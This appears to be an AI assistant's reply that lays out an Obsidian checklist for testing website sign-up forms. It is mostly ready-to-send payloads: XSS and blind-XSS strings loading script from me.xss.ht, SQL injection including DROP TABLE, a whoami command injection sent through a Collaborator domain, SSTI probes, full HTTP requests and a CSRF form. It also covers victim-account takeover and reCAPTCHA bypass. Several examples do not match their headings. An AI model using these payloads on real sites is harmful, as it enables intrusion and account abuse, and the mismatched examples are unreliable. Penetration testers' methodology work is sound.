Sure, I'll add the new items to the checklist and ensure that each item is marked with a checkbox for Obsidian. Here is the updated and enhanced checklist:

---

### Enhanced Checklist for Sign Up Vulnerabilities in Obsidian

This checklist is sorted by the potential vulnerability type and includes example payloads and additional notes.

#### General Vulnerability Categories

1. **Sensitive Information Disclosure**

   - **Existing Email Address Reflection:**
     - Payload: `email=existing@gmail.com`
     - Note: Check for authorization tokens or other sensitive information reflected in the response.
     - [ ] Done

   - **Company Email Address Reflection:**
     - Payload: `email=admin@company.com`
     - Note: Check if this grants extra authorities or functionalities.
     - [ ] Done

   - **Company Email Address Variations:**
     - Payloads: `admin@company.com (with space)`, `admin@COMPANY.COM`, `admin@gmail.com@company.com`, `me+(@gmail.com)@company.com`, `"me@gmail.com"@company.com`, `<me@gmail.com>"@company.com`, `"me@gmail.com;"@company.com`, `"me@gmail.com+"@company.com`
     - Note: Test these variations for potential access control bypass or sensitive information disclosure.
     - [ ] Done

   - **Large String Injection:**
     - Payload: Inject large strings (50,000+ characters) into POST parameters.
     - Note: Monitor for errors, which may reveal sensitive information.
     - [ ] Done

2. **Cross-Site Scripting (XSS)**

   - Payloads:
     - `me+(<script>alert(0)</script>)@gmail.com`
     - `me(<script>alert(0)</script>)@gmail.com`
     - `me@gmail(<script>alert(0)</script>).com`
     - `"<script>alert(0)</script>"@gmail.com`
     - `"<%= 7 * 7 %>"@gmail.com` (for SSTI)
     - `me+(${{7*7}})@gmail.com` (for SSTI)
     - `"' OR 1=1 -- '"@gmail.com` (for SQLi)
     - `"me); DROP TABLE users;--"@gmail.com` (for SQLi)
     - `%@gmail.com`
   - Note: Test these payloads in email addresses, usernames, first/last names, and password fields.
   - [ ] Done

3. **Server-Side Template Injection (SSTI)**

   - Payloads:
     - `{{7*7}}, {7*7}, ${{7*7}}`
     - `<script src=//me.xss.ht></script>`
     - `<img src="//me.xss.ht">`
     - `<%` (to check for reflection in email body)
     - `<%= 7 * 7 %>` (for SSTI if `<%` is reflected)
   - Note: Test these payloads in first name, last name, and username fields.
   - [ ] Done

4. **Blind XSS**

   - Payloads:
     - `"><script src=//me.xss.ht></script>`
     - `<img src="//me.xss.ht">`
   - Note: Test in first/last names, password fields, and user-agent headers.
   - [ ] Done

5. **SQL Injection (SQLi)**

   - Payloads:
     - `' AND '1' = '2 OR`
     - `";WAITFOR DELAY '0.0.20'--`
   - Note: Test these payloads in email addresses, usernames, first/last names, and user-agent headers.
   - [ ] Done

6. **Command Injection**

   - Payload:
     - `email=me@whoami.id.collaborator.net`
   - Note: Use Burp Collaborator and monitor for back-end information or internal IPs.
   - [ ] Done

7. **Authentication Bypass**

   - **Company Email Address:**
     - Payload: `admin@company.com`
     - Note: Try accessing all endpoints without verifying the account.
     - [ ] Done

   - **Spoofing Host Header:**
     - Payload: `X-Forwarded-Host: me.com`
     - Note: Test this if the company accepts the company email but doesn't activate the account.
     - [ ] Done

8. **Brute Force**

   - Payload:
     - `email=me@gmail.com&password=********`
   - Note: Use brute force tools to create multiple accounts or enumerate email addresses.
   - [ ] Done

9. **Race Conditions**

   - Payload:
     - `email=m&password=********&Invitation=Random` (for invitation-based signup)
   - Note: Use automation to create multiple accounts with a single invitation.
   - [ ] Done

10. **Mobile-Number Verification**

    - Note: If the site uses mobile verification, investigate OTP expiration, response manipulation, and UUID tampering.
    - [ ] Done

11. **CSRF**

    - Note: If no CSRF token or protection is present, attempt to craft a CSRF PoC.
    - [ ] Done

12. **Hidden Character Injection**

    - Payload:
      - `bob%00 or %01bob`
    - Note: Inject invisible range characters (%00 to %FF) into usernames or emails.
    - [ ] Done

13. **Time-Based SQLi**

    - Payload:
      - `";WAITFOR DELAY '0.0.20'--`
    - Note: Test this in X-Forwarded-For header.
    - [ ] Done

14. **Other Checks**

    - **Birthday Field Manipulation:** Test setting birthdays to today or tomorrow for potential birthday discounts.
    - [ ] Done

    - **Password Field Manipulation:**
      - Payload: `%01%E2%80%AEalert%0D%0A`
      - Note: Check for behavior if using only `%01`, logging in without CRLF, and if trela is accepted instead of alert.
      - [ ] Done

    - **True/Null/Undefined Values:** Test these values in usernames and other fields for potential errors.
    - [ ] Done

15. **Account Recovery/Deletion:**

    - Payload: Use the email address associated with a previously deleted account for sign up.
    - Note: Attempt to recover data from the deleted account.
    - [ ] Done

16. **User-Agent Manipulation:**

    - Payload:
      - Inject SQLi payloads or blind XSS payloads in the user-agent header.
    - Note: Test this to see if the user-agent header is processed insecurely.
    - [ ] Done

17. **Email Address Manipulation:**

    - Payload:
      - `me+1@gmail.com`, `me+2@gmail.com`, `me+ANYSTRING@gmail.com`
    - Note: Test these variations to see if multiple accounts can be created.
    - [ ] Done

18. **ReCAPTCHA Bypass:**

    - Payload:
      - Configure TLS Pass Through for Google reCAPTCHA in Burp Suite.
    - Note: Test if reCAPTCHA can be bypassed by intercepting and modifying the request.
    - [ ] Done

19. **Rate Limiting:**

    - Payload:
      - Send multiple sign-up requests in a short period.
    - Note: Check if the application has rate limiting in place to prevent abuse.
    - [ ] Done

20. **Session Fixation:**

    - Payload:
      - Set a session cookie before the user logs in and check if the session is maintained.
    - Note: Test if the application is vulnerable to session fixation attacks.
    - [ ] Done

21. **Insecure Direct Object References (IDOR):**

    - Payload:
      - Modify the user ID or email in the request to access other users' data.
    - Note: Test if the application properly validates user access to resources.
    - [ ] Done

22. **Weak Password Policies:**

    - Payload:
      - Use common weak passwords like `123456`, `password`, `qwerty`, etc.
    - Note: Check if the application enforces strong password policies.
    - [ ] Done

23. **Account Enumeration:**

    - Payload:
      - Use common usernames and emails to see if the application reveals the existence of accounts.
    - Note: Test if the application provides different responses for existing and non-existing accounts.
    - [ ] Done

24. **Multi-Factor Authentication (MFA) Bypass:**

    - Payload:
      - Attempt to bypass MFA by intercepting and modifying the request.
    - Note: Test if the application properly enforces MFA.
    - [ ] Done

25. **Try To Sign Up By Using This List With Burp Collaborator Mail Address To Get Backend Information OR Internal IPs:**

    - Payloads:
      - `me@id.collaborator.net`
      - `me@[id.collaborator.net]`
      - `user(;me@id.collaborator.net)@gmail.com`
      - `me@id.collaborator.net(@gmail.com)`
      - `me+(@gmail.com)@id.collaborator.net`
      - `<me@id.collaborator.net>user@gmail.com`
    - Note: Use Burp Collaborator and monitor for back-end information or internal IPs.
    - [ ] Done

26. **Sometimes They Ping Your Host Before Sending A Mail So Try To Sign Up By Using Burp Collaborator Mail Address with Injection OS Command To Get RCE:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Origin: https://www.company.com
        Content-Length: Number
        firstname=I&lastname=am&email=me@`whoami`.id.collaborator.net&password=********&captcha=Random&token=CSRF`
    - Note: Use Burp Collaborator and monitor for back-end information or internal IPs.
    - [ ] Done

27. **Try To Insert <% In Username, First Name OR Last Name, So If <% Reflected In Email Body Try To Inject <%= 7 * 7 %> To Get SSTI:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        firstname={{7*7}}&lastname={{7*7}}&username={{7*7}}
        &email=me&password=*****&captcha=Random&token=CSRF`
    - Note: Test these payloads in first name, last name, and username fields.
    - [ ] Done

28. **Try To Set Your Name, First Name, Last Name etc As Blind XSS e.g. "><script src=//me.xss.ht></script> To Get BXSS In Admin Panel:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: Number
        firstname="><script src=//me.xss.ht></script>
        &lastname="><script src=//me.xss.ht></script>&
        email=me@gmail.com&password=**************&captcha=Random
        &token=CSRF`
    - Note: Test in first/last names, password fields, and user-agent headers.
    - [ ] Done

29. **Try To Set Your Name, First Name, Last Name etc As Blind XSS e.g. <img src="//me.xss.ht"> To Get BXSS In Admin Panel:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: Number
        firstname=<img src="//me.xss.ht">
        &lastname=<img src="//me.xss.ht">&
        email=me@gmail.com&password=**************&captcha=Random
        &token=CSRF`
    - Note: Test in first/last names, password fields, and user-agent headers.
    - [ ] Done

30. **Try To Set Password As Blind XSS e.g. "><script src=//me.xss.ht></script> OR XSS Payload To Know If Your Password Reflect Plaintext In Backend OR Not:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        firstname=I&lastname=am&email=me&password="><script
        src=//me.xss.ht></script>&captcha=Random&token=CSRF`
    - Note: Test these payloads in email addresses, usernames, first/last names, and password fields.
    - [ ] Done

31. **Try To Set Your Name, First Name, Last Name etc As TRUE, NULL, UNDEFINED etc:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        firstname=TRUE&lastname=TRUE&email=me@gmail.com&password=**************&captcha=Random&token=CSRF`
    - Note: Test these values in usernames and other fields for potential errors.
    - [ ] Done

32. **Try To Insert Invisible Range %00 To %FF in Your Email OR Username e.g. Victim's Username is bob, You Can't Register it So Use bob%00 OR %01bob:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        firstname=I&lastname=am&email=me&password=%01%E2%80
        %AEalert%0D%0A&captcha=Random&token=CSRF`
    - Note: Inject invisible range characters (%00 to %FF) into usernames or emails.
    - [ ] Done

33. **Try To Set Password e.g. %01%E2%80%AEalert%0D%0A Then Try To Log In Only Using %01, Log In Without CRLF And Is trela Accepted Instead Of alert ?:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        firstname=I&lastname=am&email=me&password=%01%E2%80
        %AEalert%0D%0A&captcha=Random&token=CSRF`
    - Note: Check for behavior if using only `%01`, logging in without CRLF, and if trela is accepted instead of alert.
    - [ ] Done

34. **If The Company Uses Invitation To Create Account Try To Use Race Condition Technique To Create Multi Accounts By Using Only One Invitation:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        Accept-Encoding: gzip, deflate
        email=m&password=********&Invitation=Random`
    - Note: Use automation to create multiple accounts with a single invitation.
    - [ ] Done

35. **Try To Do Brute Force To Create Multi Accounts OR Enumerate Email Addresses If The Company Doesn't Send Activation Link To Your Account:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        Accept-Encoding: gzip, deflate
        email=me@gmail.com&password=********`
    - Note: Use brute force tools to create multiple accounts or enumerate email addresses.
    - [ ] Done

36. **Try To Inject Blind XSS e.g. "><script src=//me.xss.ht></script> OR Time-Based SQLi e.g. ";WAITFOR DELAY '0.0.20'-- In X-Forwarded-For Header:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        Accept-Encoding: gzip, deflate
        email=me@gmail.com&password=********`
    - Note: Test this in X-Forwarded-For header.
    - [ ] Done

37. **Try To Set Your Birthday Today OR Tomorrow To Test Functionality Of Buying Giftcards With Birthday Discounts:**

    - Payload:
      - `POST /signUp HTTP/1.1
        Host: www.company.com
        User-Agent: Mozilla/5.0
        Content-Type: application/x-www-form-urlencoded
        Referer: https://previous.com/path
        Origin: https://www.company.com
        Content-Length: Number
        firstname=I&lastname=am&email=me@gmail.com&birthday=
        Today&password=*****&captcha=Random&token=CSRF`
    - Note: Test setting birthdays to today or tomorrow for potential birthday discounts.
    - [ ] Done

38. **If You Can Register By Using Mobile-Number, The Server Will Ask You about OTP So Try To Figure Out If OTP Will Expire OR Not, If Not There Is Issue Here:**

    - Payload:
      - `HTTP/1.1 200 OK
        Access-Control-Allow-Origin: https://www.company.com
        Access-Control-Allow-Credentials: true
        Content-Type: application/json; charset=utf-8
        Content-Length: length
        {
        "status" : 1 ,
        "message" : "OTP Matched Successfully"
        }`
    - Note: Investigate OTP expiration, response manipulation, and UUID tampering.
    - [ ] Done

39. **Try To Change Any UUID e.g. ID, Email OR Phone In The Response To UUID Of Victim Account While Intercepting Response Of Request Of The Sign Up:**

    - Payload:
      - `HTTP/1.1 200 OK
        Access-Control-Allow-Origin: https://www.company.com
        Access-Control-Allow-Credentials: true
        Content-Type: application/json; charset=utf-8
        Content-Length: length
        {
        "email" : "victim@gmail.com" ,
        "redirect" : "/dashboard"
        }`
    - Note: Try to change any UUID in the response to the UUID of the victim account.
    - [ ] Done

40. **If There Isn't CSRF Token OR Anti-CSRF, Try To Create CSRF PoC:**

    - Payload:
      - `<html>
        <body><form method="POST"
        action="https://www.company.com">
        <input type="text" value="me@gmail.com"
        name="email">
        <input type="text" value="Secrete" name="password">
        <input type="submit" value="Click">
        </form></body>
        </html>`
    - Note: If no CSRF token or protection is present, attempt to craft a CSRF PoC.
    - [ ] Done

#### Important Notes

- **Use Burp Suite:** Use Burp Suite for intercepting requests and responses, creating payloads, and setting up TLS Pass Through for Google reCAPTCHA bypass.
- **Collaborator Server:** Leverage Burp Collaborator for detecting back-end information, internal IPs, and blind XSS.
- **Security Best Practices:** Always follow security best practices and consult with your organization's security team before testing these techniques on production systems.

---

This enhanced checklist includes additional potential vulnerabilities and examples to provide a more comprehensive vulnerability assessment. Each item is marked with a checkbox for tracking progress in Obsidian.
